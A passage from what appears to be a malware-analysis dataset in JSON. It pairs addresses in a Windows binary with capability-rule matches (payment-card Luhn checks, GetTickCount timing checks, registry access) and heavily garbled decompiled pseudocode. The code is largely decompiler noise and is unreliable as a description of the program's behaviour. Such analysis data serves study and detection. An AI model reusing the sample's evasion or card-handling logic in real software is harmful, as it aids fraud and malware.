+ 0xe) = *(iVar3 + 0xe) + extraout_CH;\n    *(puVar11 + -3) = 0x407014;\n    *(puVar11 + -7) = 0x401b5a;\n    fcn.00404580(*(puVar11 + -3), *(puVar11 + 1), *(puVar11 + 5), *(puVar11 + 9));\n    return;\n}\n",
        "token_count": 4128
    },
    "00401e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get common file path",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401f44) overlaps instruction at (ram,0x00401f42)\n// \n\nuint __cdecl fcn.00401e30(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    char *pcVar5;\n    uint *unaff_ESI;\n    uint *puVar6;\n    bool bVar7;\n    uint8_t in_AF;\n    ulong uVar8;\n    uchar *arg_ch;\n    uchar var_210h;\n    uint var_20fh;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    char cVar3;\n    \n    var_210h = 0;\n    puVar6 = &var_20fh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_10ch = 0;\n    puVar6 = &var_10bh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    arg_ch = &var_210h;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(arg_ch, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_10ch, 0x424158, &var_210h, arg_8h);\n    fcn.00403710(&var_4h, &var_8h);\n    fcn.00401f70(var_4h, arg_ch);\n    uVar8 = fcn.004028c0(&var_10ch, var_4h, var_8h);\n    pcVar5 = uVar8 >> 0x20;\n    uVar2 = uVar8;\n    bVar7 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 == 0) {\n        return 0;\n    }\n    if (bVar7) {\n        if (!bVar7) {\n            out(*unaff_ESI, uVar8 >> 0x20);\n            do {\n                cVar3 = uVar2 >> 8;\n                in_AF = 9 < (uVar2 & 0xf) | in_AF;\n                uVar2 = CONCAT31(CONCAT21(uVar2 >> 0x10, cVar3 - in_AF), -in_AF);\n            } while (in_AF || cVar3 == *pcVar5);\n            piVar1 = puVar6 + pcVar5 * 2 + 3;\n            *piVar1 = (*piVar1 + 0x7b) - in_AF;\n            *(extraout_ECX + -0x73) = uVar2;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.004048d0(&var_10ch, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 787
    },
    "00401f70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f87) overlaps instruction at (ram,0x00401f85)\n// \n// WARNING: Removing unreachable block (ram,0x00402154)\n// WARNING: Removing unreachable block (ram,0x00402172)\n// WARNING: Removing unreachable block (ram,0x00402177)\n// WARNING: Removing unreachable block (ram,0x0040217d)\n// WARNING: Removing unreachable block (ram,0x00402189)\n// WARNING: Removing unreachable block (ram,0x0040219a)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401f70(int16_t *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t *puVar4;\n    uint *puVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int16_t *piVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    char *unaff_EBX;\n    uint *puVar12;\n    int32_t unaff_ESI;\n    uint *puVar13;\n    uint32_t unaff_EDI;\n    uint *puVar14;\n    ushort in_SS;\n    bool bVar15;\n    bool bVar16;\n    uint uStack35;\n    uchar uStack31;\n    ushort uStack30;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar5 = &stack0xfffffffc;\n    uStack31 = 0xfc;\n    if (((-1 < &var_ch) && (-1 >= &var_ch)) || (*arg_8h != 0x5a4d)) {\n        return 0;\n    }\n    bVar15 = CARRY4(*(arg_8h + 0x1e), arg_8h);\n    puVar4 = *(arg_8h + 0x1e) + arg_8h;\n    if ((bVar15 || puVar4 == NULL) || (!bVar15 && puVar4 != NULL)) {\n        bVar15 = *puVar4 < 0x4550;\n        bVar16 = *puVar4 == 0x4550;\n        piVar9 = arg_8h;\n    }\n    else {\n        cVar1 = *unaff_EBX;\n        *(unaff_EDI - 0x7f) = *(unaff_EDI - 0x7f) - &stack0xffffffe5;\n        bVar15 = CARRY1(*puVar4, puVar4);\n        *puVar4 = *puVar4 + puVar4;\n        bVar16 = *puVar4 == 0;\n        piVar9 = arg_8h & 0xffff0000 | CONCAT11((arg_8h >> 8) - cVar1, arg_8h);\n    }\n    if (!bVar16) {\n        return 0;\n    }\n    if ((bVar15) || (!bVar15)) {\n        piVar9 = puVar4[0x16];\n    }\n    else {\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x8b27e95e;\n        puVar4 = unaff_EDI >> 8;\n    }\n    if (piVar9 != NULL) {\n        return 0;\n    }\n    var_4h = 0x40;\n    uStack31 = SUB41(puVar4, 0);\n    uStack30 = puVar4 >> 8;\n    bVar15 = *(arg_8h + 0x1e) != 0x80;\n    if (*(arg_8h + 0x1e) < 0x81) {\n        return 0;\n    }\n    puVar12 = &stack0xfffffffc;\n    if ((bVar15) && (puVar12 = &stack0xfffffffc,  !bVar15)) {\n        puVar13 = &uStack31;\n        puVar12 = &uStack31;\n        uStack30 = &stack0xfffffffc >> 8;\n        cVar1 = '\\x10';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar13 = puVar13 + -1;\n            *puVar13 = *puVar5;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    if (*(arg_8h + 0x1e) < 0xc0) {\n        uVar10 = *(arg_8h + 0x1e) - 0x80;\n        puVar12[-1] = uVar10;\n    }\n    else {\n        uVar10 = puVar12[-1];\n    }\n    uStack31 = uVar10;\n    uStack30 = uVar10 >> 8;\n    puVar5 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n    puVar12[-3] = puVar5;\n    bVar15 = (POPCOUNT(puVar5 & 0xff) & 1U) != 0;\n    if (puVar5 == NULL) {\n        return 0;\n    }\n    if ((bVar15) && (!bVar15)) {\n        puVar5 = &uStack31;\n        uStack31 = SUB41(puVar12, 0);\n        uStack30 = puVar12 >> 8;\n        cVar1 = '\\x1e';\n        do {\n            puVar12 = puVar12 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar12;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar6 = in(0x78);\n        return uVar6;\n    }\n    puVar12[-2] = 0;\n    if (uVar10 == 0) goto code_r0x004020d6;\n    do {\n        uStack31 = 0xb4;\n        uStack30 = 0x4020;\n        iVar7 = (*_sym.imp.MSVCRT.dll_rand)();\n        iVar11 = iVar7 >> 0x1f;\n        uVar10 = 0xff;\n        while( true ) {\n            iVar2 = puVar12[-2];\n            uVar8 = iVar2 + 1;\n            puVar12[-2] = uVar8;\n            *(iVar2 + puVar12[-3]) = CONCAT44(iVar11, iVar7) % uVar10;\n            uVar10 = puVar12[-1];\n            if (uVar8 < uVar10) break;\n            puVar5 = puVar12[-3];\ncode_r0x004020d6:\n            uStack31 = SUB41(unaff_EBX, 0);\n            uStack30 = unaff_EBX >> 8;\n            unaff_EBX = unaff_EBX & 0xffffff;\n            puVar13 = puVar5;\n            puVar14 = puVar12[2] + 0x80;\n            for (uVar8 = uVar10 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {\n                *puVar14 = *puVar13;\n                puVar13 = puVar13 + 1;\n                puVar14 = puVar14 + 1;\n            }\n            uVar10 = uVar10 & 3;\n            bVar15 = (POPCOUNT(uVar10) & 1U) == 0;\n            for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n                *puVar14 = *puVar13;\n                puVar13 = puVar13 + 1;\n                puVar14 = puVar14 + 1;\n            }\n            if (bVar15) goto code_r0x00402133;\n            uStack31 = SUB41(puVar5, 0);\n            uStack30 = puVar5 >> 8;\n            puVar5 = puVar5 & 0xffffff;\n            if (!bVar15) goto code_r0x00402133;\n            piVar3 = segment(in_SS, *0x10 + -0x1b);\n            iVar7 = *piVar3;\n            iVar11 = -0x4843615b;\n            if (!bVar15) {\n                puVar5 = iVar7;\ncode_r0x00402133:\n                uStack31 = SUB41(puVar5, 0);\n                uStack30 = puVar5 >> 8;\n                sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n                return 1;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 1951
    },
    "00402150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402189)\n\nuint __cdecl fcn.00402150(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = arg_ch;\n    uVar1 = arg_8h;\n    iVar3 = fcn.004010c0(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar3 != 0) {\n        *(iVar3 + 0x58) = arg_ch;\n        fcn.004010c0(uVar1, uVar2, &arg_8h, &arg_ch);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 166
    },
    "00402470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004024a7) overlaps instruction at (ram,0x004024a2)\n// \n\nchar * __cdecl fcn.00402470(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    char *unaff_EBX;\n    char *pcVar5;\n    char *pcVar6;\n    bool bVar7;\n    \n    pcVar3 = arg_8h + (arg_ch - arg_14h);\n    bVar7 = arg_14h != 0;\n    if (bVar7) {\n        pcVar5 = pcVar3;\n        if (((bVar7) && (!bVar7)) || (unaff_EBX = arg_8h,  arg_8h <= pcVar3)) {\n            do {\n                cVar2 = *unaff_EBX;\n                *(arg_14h + 0x3b) = *(arg_14h + 0x3b) - &stack0xfffffff0;\n                puVar1 = unaff_EBX + 0x663877d8;\n                *puVar1 = *puVar1 >> 0x12 | *puVar1 << 0xe;\n                pcVar5 = pcVar5 & 0xffff0000 | CONCAT11((pcVar5 >> 8) - cVar2, pcVar5);\n                if (*unaff_EBX == *arg_10h) {\n                    bVar7 = true;\n                    iVar4 = arg_14h;\n                    pcVar5 = unaff_EBX;\n                    pcVar6 = arg_10h;\n                    do {\n                        pcVar6 = pcVar6 + 1;\n                        pcVar5 = pcVar5 + 1;\n                        iVar4 = iVar4 + -1;\n                        if (iVar4 == 0) break;\n                        bVar7 = *pcVar5 == *pcVar6;\n                    } while (bVar7);\n                    pcVar5 = pcVar3;\n                    if (bVar7) {\n                        return unaff_EBX;\n                    }\n                }\n                unaff_EBX = unaff_EBX + 1;\n            } while (unaff_EBX <= pcVar5);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 535
    },
    "00402560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004025fe) overlaps instruction at (ram,0x004025fd)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00402560(uint8_t *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar4;\n    uint8_t uVar5;\n    int32_t iVar6;\n    uint16_t uVar7;\n    uint32_t unaff_EBX;\n    uint16_t unaff_SI;\n    int32_t iVar8;\n    uint32_t *unaff_EDI;\n    bool bVar9;\n    uint16_t uStack32;\n    ushort uStack28;\n    uint16_t uStack26;\n    uint16_t uStack24;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    uint8_t *puVar3;\n    \n    uStack28 = SUB42(unaff_EDI, 0);\n    uStack26 = unaff_EDI >> 0x10;\n    var_ch._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    if (0 < arg_14h) {\n        iVar8 = 1;\n        iVar4 = arg_14h;\n        uStack24 = unaff_SI;\n        do {\n            uStack32 = unaff_EBX;\n            bVar9 = ((uStack32 & 0xff00 | unaff_EBX | iVar4 >> 8) & 0x94f) != 0;\n            uVar5 = *(var_8h + arg_10h);\n            if ((bVar9) && (!bVar9)) {\n                iVar8 = CONCAT22(uStack26, uStack28);\n            }\n            uVar1 = arg_8h[iVar8 % arg_ch];\n            *(unaff_EBX + 0x66) = *(unaff_EBX + 0x66) + 0x52;\n            iVar6 = (iVar8 + -1) % arg_ch;\n            uVar5 = uVar5 ^ arg_8h[iVar6];\n            bVar9 = (POPCOUNT(uVar5) & 1U) != 0;\n            puVar3 = arg_8h;\n            if ((bVar9) && (!bVar9)) {\n                *unaff_EDI = *unaff_EDI | 0xffffff8e;\n                uVar2 = arg_8h | *arg_8h;\n                puVar3 = arg_8h & 0xffffff00 | uVar2;\n                *puVar3 = *puVar3 + uVar2;\n            }\n            uVar5 = var_ch ^ uVar5;\n            *(arg_18h + -1 + iVar8) = uVar5;\n            uVar7 = uStack26;\n            uStack28 = puVar3 >> 0x10;\n            unaff_EBX = uStack24 << 0x10 | uStack26 & 0xffffff00 | uVar1;\n            *(iVar8 + arg_18h) = var_ch ^ uVar1;\n            iVar4 = var_8h + 1;\n            iVar8 = iVar8 + 2;\n            uStack26 = iVar6 & 0xff00 | uVar5;\n            uStack24 = uVar7;\n            var_8h = iVar4;\n        } while (iVar4 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 807
    },
    "00402cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402cd1)\n\nvoid fcn.00402cb0(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4245d8 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x4245d8 = 1;\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "004030e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403114) overlaps instruction at (ram,0x00403110)\n// \n// WARNING: Removing unreachable block (ram,0x00403140)\n\nulong __fastcall fcn.004030e0(uint param_1, int32_t **param_2, int32_t **param_3)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint8_t uVar4;\n    int16_t iVar5;\n    uint16_t uVar6;\n    int32_t **in_EAX;\n    char *pcVar7;\n    uint8_t *puVar8;\n    int32_t **ppiVar9;\n    int32_t **ppiVar10;\n    uint uVar11;\n    uint8_t uVar12;\n    uint extraout_EDX;\n    uint32_t unaff_EBX;\n    uint *puVar13;\n    uint *puVar14;\n    int32_t **unaff_ESI;\n    int32_t **unaff_EDI;\n    int32_t **ppiVar15;\n    bool in_CF;\n    bool bVar16;\n    uint8_t in_AF;\n    bool bVar17;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    float10 extraout_ST0;\n    ulong uVar18;\n    int32_t **ppiStack20;\n    \n    puVar14 = &stack0xfffffffc;\n    uVar4 = in_EAX;\n    if ((!in_CF) && (in_CF)) {\n        ppiVar15 = unaff_EDI + 1;\n        cVar3 = uVar4 - *unaff_EDI;\n        ppiStack20 = (in_NT & 1) * 0x4000 | SBORROW1(uVar4, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                     (in_TF & 1) * 0x100 | (cVar3 < '\\0') * 0x80 | (cVar3 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                     ((POPCOUNT(cVar3) & 1U) == 0) * 4 | uVar4 < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                     (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        unaff_ESI = unaff_ESI + -1;\n        uVar18 = func_0x10189070();\n        ppiVar9 = uVar18;\n        param_3 = unaff_EBX + 0x1c6084d;\n        param_2 = uVar18 >> 0x20 & 0xffffff00 | uVar18 >> 0x20 & *(ppiVar9 + -0x57);\n        puVar14 = 0x2a00007c;\n        if (param_3 != NULL) {\n            pcVar7 = in(param_2);\n            uVar4 = pcVar7 - *pcVar7;\n            puVar8 = pcVar7 & 0xffffff00 | uVar4;\n            puVar8[-0x51dab23c] = puVar8[-0x51dab23c] + uVar4;\n            bVar16 = CARRY1(*puVar8, uVar4);\n            *puVar8 = *puVar8 + uVar4;\n            unaff_EDI = ppiVar15;\n            goto code_r0x00403119;\n        }\n        puVar14 = 0x2a00007c;\n        *ppiVar15 = extraout_ST0;\n        *ppiVar9 = *ppiVar9 + uVar18;\n        puVar8 = ppiVar9 + 0x4bb148d3;\n        uVar4 = uVar18 >> 8;\n        bVar16 = CARRY1(*puVar8, uVar4);\n        *puVar8 = *puVar8 + uVar4;\n        goto code_r0x00403156;\n    }\n    *param_3 = 0x22;\n    uVar6 = CONCAT11(((in_EAX >> 8) - unaff_EBX) + 'M', uVar4);\n    ppiStack20 = in_EAX;\n    while( true ) {\n        bVar16 = false;\n        puVar8 = uVar6 & 0x26ae;\ncode_r0x00403119:\n        iVar5 = puVar8;\n        bVar17 = iVar5 == 1;\n        *(param_3 + 1) = 0x7a;\n        ppiVar9 = ppiStack20;\n        ppiVar15 = unaff_EDI;\n        ppiVar10 = ppiStack20;\n        if ((0 < iVar5) && (ppiVar10 = unaff_EDI,  iVar5 < 1)) {\n            unaff_ESI = unaff_ESI + -1;\n            ppiVar15 = (unaff_EDI | puVar14) + 1;\n            *(unaff_EDI | puVar14) = ppiStack20;\n            bVar16 = false;\n            param_2 = param_2 & 0xffffff00;\n            uVar6 = ppiStack20 + (ppiStack20 >> 8) * 'y';\n            ppiVar9 = ppiStack20 & 0xffff0000 | uVar6;\n            bVar17 = uVar6 == 0;\n            ppiVar10 = unaff_EDI;\n        }\n        ppiStack20 = ppiVar10;\n        *(param_3 + 2) = 0xa4;\n        if ((!bVar17) && (bVar17)) {\n            ppiVar9 = ppiVar9 & 0xffffff00 | *0x4bb148d3;\ncode_r0x00403156:\n            out(*unaff_ESI, param_2);\n        }\n        *(param_3 + 3) = 0;\n        if ((!bVar16) && (bVar16)) {\n            func_0x101890e5();\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(param_3 + 1) = 0x10;\n        bVar16 = (param_2 & 0x1200) == 0;\n        unaff_ESI = puVar14[2];\n        *(unaff_ESI + 5) = 0x68;\n        if ((bVar16) || (!bVar16)) break;\n        in_AF = 9 < (ppiVar9 & 0xf) | in_AF;\n        uVar6 = CONCAT11((ppiVar9 >> 8) + in_AF, ppiVar9 + in_AF * '\\x06') & 0xff0f;\n        unaff_EDI = ppiVar15;\n        if (param_3 != NULL) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    *(unaff_ESI + 6) = 0xf9;\n    *(unaff_ESI + 7) = 0xe5;\n    *(unaff_ESI + 2) = 0xf3;\n    *(unaff_ESI + 9) = 0x44;\n    uVar12 = (param_3 << 0x10) >> 0x18 ^ unaff_EBX;\n    bVar16 = uVar12 << 8 < 0;\n    uVar4 = POPCOUNT(uVar12);\n    *(unaff_ESI + 10) = 0x11;\n    if ((uVar12 == 0 || bVar16) || (uVar12 != 0 && !bVar16)) {\n        *(unaff_ESI + 0xb) = 0xdd;\n    }\n    else {\n        uVar4 = POPCOUNT((unaff_EBX | puVar14) & 0xff);\n    }\n    bVar16 = (uVar4 & 1) == 0;\n    if ((bVar16) || (!bVar16)) {\n        *(unaff_ESI + 3) = 0x95;\n        ppiVar10 = ppiVar9;\n    }\n    else {\n        puVar14 = *0xc617b43a;\n        unaff_ESI = 0x34a96cf5;\n        ppiVar10 = param_2 + 1 | 0x95;\n        param_2 = ppiVar9;\n    }\n    *(unaff_ESI + 0xd) = 6;\n    iVar2 = puVar14[2];\n    *(iVar2 + 0xe) = 0x13;\n    uVar4 = param_3 - 5;\n    while( true ) {\n        ppiVar9 = param_2;\n        param_2 = unaff_ESI;\n        bVar16 = (POPCOUNT(uVar4 & 0x44) & 1U) != 0;\n        *(iVar2 + 0xf) = 0x3c;\n        if ((bVar16) && (!bVar16)) {\n            puVar13 = &stack0xffffffe8;\n            cVar3 = '\\x1e';\n            do {\n                puVar14 = puVar14 + -1;\n                puVar13 = puVar13 + -1;\n                *puVar13 = *puVar14;\n                cVar3 = cVar3 + -1;\n            } while ('\\0' < cVar3);\n            uVar11 = in(0x78);\n            return CONCAT44(ppiVar9, uVar11);\n        }\n        *(iVar2 + 0x10) = 0x84;\n        *(iVar2 + 0x11) = 0x54;\n        uVar6 = ppiVar10 + iVar2 | 0x11a9;\n        bVar17 = uVar6 == 0;\n        bVar16 = (POPCOUNT(uVar6 & 0xff) & 1U) == 0;\n        *(iVar2 + 0x12) = 0x21;\n        unaff_ESI = param_2;\n        if ((bVar16) || (!bVar16)) goto code_r0x004032f3;\n        unaff_ESI = *ppiVar15;\n        *ppiVar15 = param_2;\n        puVar14 = puVar14 - *(puVar14 + 0x5f9dff63);\n        if (-1 < puVar14) break;\n        uVar4 = param_3;\n        param_3 = ppiVar9;\n    }\n    bVar17 = unaff_ESI == NULL;\n    if (-1 < unaff_ESI) {\n        puVar8 = unaff_ESI + -0x47;\n        *puVar8 = *puVar8 ^ ppiVar10 >> 8;\n        bVar16 = *puVar8 < '\\0';\n        puVar1 = param_3 + iVar2 * 2;\n        *puVar1 = *puVar1 >> 1 | ((*puVar1 & 1) != 0) << 0x1f;\n        fcn.004030e0();\n        if ((bVar16) || (uVar11 = extraout_EDX,  !bVar16)) {\n            uVar11 = puVar14[-1];\n        }\n        uVar11 = fcn.00402d80(puVar14 + -0x1a, uVar11, 0x407024, 0xa120);\n        puVar13 = puVar14[3];\n        *puVar14[2] = 0x407024;\n        *puVar13 = 0xa120;\n        return CONCAT44(puVar13, uVar11);\n    }\ncode_r0x004032f3:\n    *(iVar2 + 0x13) = 0x71;\n    if ((!bVar17) && (bVar17)) {\n        out(*unaff_ESI, ppiVar9);\n    }\n    puVar14 = puVar14[3];\n    *puVar14 = 0x14;\n    return CONCAT44(ppiVar9, puVar14);\n}\n",
        "token_count": 2747
    },
    "00403320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403373) overlaps instruction at (ram,0x00403371)\n// \n\nvoid __cdecl fcn.00403320(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint arg_ch_00;\n    uint *puVar2;\n    bool bVar3;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    bVar3 = false;\n    fcn.004030e0(&var_68h, &var_4h);\n    if ((bVar3) || (arg_ch_00 = extraout_EDX,  !bVar3)) {\n        arg_ch_00 = var_4h;\n    }\n    fcn.00402d80(&var_68h, arg_ch_00, 0x407024, 0xa120);\n    *arg_8h = 0x407024;\n    *arg_ch = 0xa120;\n    return;\n}\n",
        "token_count": 331
    },
    "004033b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004033d8) overlaps instruction at (ram,0x004033d7)\n// \n\nuint fcn.004033b0(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint *puVar3;\n    ushort extraout_CX;\n    \n    puVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x424238);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (puVar3 == NULL) {\n        return 0;\n    }\n    *0x4245e0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(puVar3, 0x424248);\n    _pe_dos_header = *puVar3;\n    *(*0x4245e0 + 0x4a) = *(*0x4245e0 + 0x4a) + (extraout_CX >> 8);\n    *(puVar3 + 3) = *(puVar3 + 3) + -0x73;\n    piVar1 = pcVar2 + 0x4245e0;\n    *piVar1 = *piVar1 << (extraout_CX & 0x1f);\n    *0x4245e4 = (*pcVar2)(puVar3 + 1, 0x424264);\n    *0x4245e8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(puVar3 + 1, 0x424274);\n    if (((*0x4245e0 != 0) && (*0x4245e4 != 0)) && (*0x4245e8 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 385
    },
    "00403470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004034bd) overlaps instruction at (ram,0x004034ba)\n// \n// WARNING: Removing unreachable block (ram,0x004034e5)\n// WARNING: Removing unreachable block (ram,0x004034ef)\n\nuint __cdecl fcn.00403470(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    uint uVar2;\n    uint uVar3;\n    uint *unaff_EDI;\n    bool in_OF;\n    uint hKey;\n    \n    if ((in_OF) || (uVar2 = in_ECX,  !in_OF)) {\n        uVar2 = arg_ch;\n    }\n    uVar3 = 5;\n    *unaff_EDI = *0x1;\n    *(unaff_EDI + 1) = *(unaff_EDI + 1) + uVar2;\n    *0x8b0c4d8b = *0x8b0c4d8b + (uVar2 >> 8);\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x8b0c4d8b, uVar2, &stack0xfffffffc);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(in_ECX, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        if (iVar1 != 0) {\n            uVar3 = 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(in_ECX);\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 406
    },
    "00403510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040376e) overlaps instruction at (ram,0x0040376c)\n// \n// WARNING: Removing unreachable block (ram,0x0040356f)\n// WARNING: Removing unreachable block (ram,0x00403579)\n// WARNING: Removing unreachable block (ram,0x0040357d)\n// WARNING: Removing unreachable block (ram,0x00403584)\n// WARNING: Removing unreachable block (ram,0x004036d0)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00403510(int32_t *param_1, int32_t *param_2, char *param_3)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint16_t uVar4;\n    uint16_t uVar5;\n    uint16_t uVar6;\n    uint8_t uVar7;\n    uint16_t uVar8;\n    uint16_t uVar9;\n    char cVar11;\n    uint32_t in_EAX;\n    char *pcVar10;\n    int32_t *piVar12;\n    uint8_t uVar13;\n    uint extraout_EDX;\n    uint arg_ch;\n    uint unaff_EBX;\n    uchar *puVar14;\n    uint unaff_ESI;\n    char *pcVar15;\n    char *pcVar16;\n    char **unaff_EDI;\n    int32_t iVar17;\n    char **ppcVar18;\n    uint16_t in_ES;\n    uint16_t in_SS;\n    uint16_t in_DS;\n    bool bVar19;\n    uint8_t in_AF;\n    bool bVar20;\n    unkbyte10 in_ST0;\n    int32_t *piStack20;\n    uint16_t uStack16;\n    uint16_t uStack14;\n    uint16_t uStack12;\n    uint16_t uStack10;\n    ushort uStack8;\n    ushort uStack6;\n    \n    puVar14 = &stack0xfffffffc;\n    uStack8 = unaff_ESI;\n    uStack6 = unaff_ESI >> 0x10;\n    uStack12 = unaff_EDI;\n    uStack10 = unaff_EDI >> 0x10;\n    uStack16 = in_EAX;\n    *param_3 = '&';\n    while( true ) {\n        param_3[1] = -0x4e;\n        piStack20._0_2_ = param_2;\n        param_3[2] = -0x5b;\n        uVar13 = param_2;\n        bVar19 = (POPCOUNT(uVar13 ^ unaff_EBX >> 8 | 0x67) & 1U) == 0;\n        param_3[3] = -0x4a;\n        uVar7 = param_2 >> 8;\n        pcVar15 = param_3;\n        if 